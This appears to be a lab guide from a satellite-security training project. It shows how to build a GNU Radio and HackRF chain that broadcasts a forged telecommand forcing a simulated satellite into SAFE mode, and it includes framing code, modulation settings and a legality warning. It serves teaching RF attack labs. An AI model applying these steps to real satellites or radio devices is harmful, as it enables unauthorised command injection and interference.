# GFSK TX recipe — GNU Radio Companion

Transmit a forged Semaeopus frame over the air with a HackRF. Useful
for the L05/L06 attacks if you don't have a Pico+CC1101 attacker
front-end, and unavoidable for L10's RF-jam lab.

> **Legality.** TX into the air on 433.92 MHz at any meaningful
> power is regulated in every jurisdiction. Use a dummy load (50 Ω
> terminator) or operate inside a Faraday cage unless you hold the
> relevant licence. The 0 dBm bench-distance default below is well
> under EU/R1 ISM limits for unintended emissions; turn the HackRF
> IF/RF gain down accordingly.

## Inputs

A pre-built Semaeopus frame as raw bytes:

```bash
python -c "
import sys
sys.path.insert(0, '.')
from protocol import space_packet as sp
frame = sp.encode(sp.TYPE_TC, sp.APID_FORCE_SAFE, 1, b'')
with open('/tmp/tc.bin', 'wb') as f: f.write(frame)
print('wrote /tmp/tc.bin:', frame.hex())
"
```

The frame already contains `[LEN][space packet][CRC]`. The GFSK TX
chain prepends preamble + sync.

## Build

### Variables
- `samp_rate` = 2e6
- `bit_rate` = 9600
- `sps` = `int(samp_rate / bit_rate)`   # 208 for 2 Msps
- `deviation` = 4800
- `centre_freq` = 433920000

### Block 1: File Source

| Property      | Value                              |
|---------------|------------------------------------|
| File          | `/tmp/tc.bin`                      |
| Type          | `byte`                             |
| Repeat        | `No`                               |
| Vec. length   | `1`                                |

### Block 2: Packet Encoder (or a custom Embedded Python Block)

The simpler path is to prepend preamble + sync in a Python block:

```python
import numpy as np
import pmt
from gnuradio import gr

PREAMBLE = bytes.fromhex("AAAAAAAA")
SYNC     = bytes.fromhex("D391")

class semaeopus_framer(gr.sync_block):
    def __init__(self):
        gr.sync_block.__init__(self,
            name='semaeopus_framer',
            in_sig=[np.uint8], out_sig=[np.uint8])
        self.prefix = PREAMBLE + SYNC
        self.sent_prefix = False

    def work(self, input_items, output_items):
        in0 = input_items[0]
        out = output_items[0]
        if not self.sent_prefix:
            n_pref = min(len(self.prefix), len(out))
            out[:n_pref] = np.frombuffer(self.prefix[:n_pref], dtype=np.uint8)
            self.sent_prefix = (n_pref == len(self.prefix))
            return n_pref
        n = min(len(in0), len(out))
        out[:n] = in0[:n]
        return n
```

### Block 3: Unpacked-to-packed → bits stream

Use **Packed-to-Unpacked** with `Bits per chunk = 1`. Output is one bit
per byte (0x00 or 0x01).

### Block 4: GFSK Mod

| Samples / symbol | `sps` (208)                       |
| Sensitivity      | `2 * pi * deviation / samp_rate`  |
| BT               | `0.5`  (CC1101 spec — real link)  |
| Verbose          | `False`                           |

GNU Radio's built-in **GFSK Mod** block does the NRZ + Gaussian
filter + integrator in one step.

### Block 5: Osmocom Sink (HackRF)

| Sample rate   | `samp_rate`                       |
| RF Gain       | 14                                |
| IF Gain       | 20                                |
| BB Gain       | 16                                |
| Frequency     | 433920000                         |
| Bandwidth     | 0  (auto)                         |

## Sanity check

In a second terminal, run the operator GS pointed at the same Pico
front-end you're flying the satellite with. After the TX completes
(takes ~30 ms for a ~30-byte frame at 9600 bps), the satellite
should print `[sat] TC apid=0x0ff ...` and switch into SAFE mode.

If nothing happens:
- Check the file source actually emitted bytes (add a Tag Debug block).
- Confirm the Osmocom Sink is receiving samples (LED on the HackRF
  blinks during TX).
- Verify `deviation` matches the satellite's `RF_DEVIATION_HZ`.
- The GFSK Mod block uses BT=0.5 — if your satellite is decoding a
  BT=1.0 synthetic capture (the Semaeopus default), there's a
  spectral mismatch that won't matter for a single TX but will
  affect long bursts.

## Why not use Semaeopus's Python TX directly?

You can — `tools/generate_iq.py` plus `hackrf_transfer -t` of the
resulting `.cu8` file will transmit a frame just as well, without
GNU Radio in the loop. Choose the path that fits your existing
toolchain.
